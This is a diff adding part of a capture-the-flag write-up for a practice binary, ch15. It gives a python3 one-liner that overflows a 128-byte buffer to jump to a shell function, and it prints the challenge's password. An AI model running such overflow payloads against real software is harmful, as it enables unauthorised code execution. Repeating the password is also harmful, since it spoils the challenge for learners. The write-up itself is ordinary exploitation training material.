@@ -35,3 +35,28 @@ nm ./basic | grep shell
 
 ![2 6](https://github.com/user-attachments/assets/a6ce26fd-6948-40bf-86f0-f02c733b3a41)
 
+We need to fill the first 128 bytes with "garbage" and after these 128 bytes, after the buffer overflow, point to the address of the shell function, the last byte 133 is closed with a zero byte.
+
+# Exploit
+
+First, let's find out the address of the function on the remote server, because it may be different
+```bash
+nm ./ch15 | grep shell
+```
+
+Enter the command using python3
+
+```bash
+(python3 -c "import sys; sys.stdout.buffer.write(b'A' * 128 + b'\x16\x85\x04\x08')"; cat) | ./ch15 
+```
+
+We import the sys library and fill the buffer with 128 characters, then enter the address of the shell function, cat for interactive interaction, and then run the program.
+
+![2 7](https://github.com/user-attachments/assets/12da8333-0916-4e12-b9b5-9a1d1720cbfe)
+
+# Post-Exploitation
+
+**Password: B33r1sSoG0oD4y0urBr4iN**
+
+![2 8](https://github.com/user-attachments/assets/74ddb88f-0b54-41ec-88b0-252d3a751754)
+
